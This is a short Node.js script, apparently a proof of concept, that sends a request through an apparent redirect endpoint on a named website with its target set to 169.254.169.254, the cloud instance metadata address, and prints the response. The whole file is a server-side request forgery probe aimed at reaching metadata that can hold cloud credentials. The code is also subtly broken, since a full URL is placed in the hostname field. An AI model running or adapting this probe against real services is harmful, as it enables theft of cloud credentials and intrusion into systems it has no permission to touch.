const http = require("http")

http
  .request(
    {
      hostname: "https://api.dinerstables.com/redirect?url=http://169.254.169.254",
    },
    res => {
      let data = ""

      res.on("data", d => {
        data += d
      })
      res.on("end", () => {
        console.log(data)
      })
    }
  )
  .end()
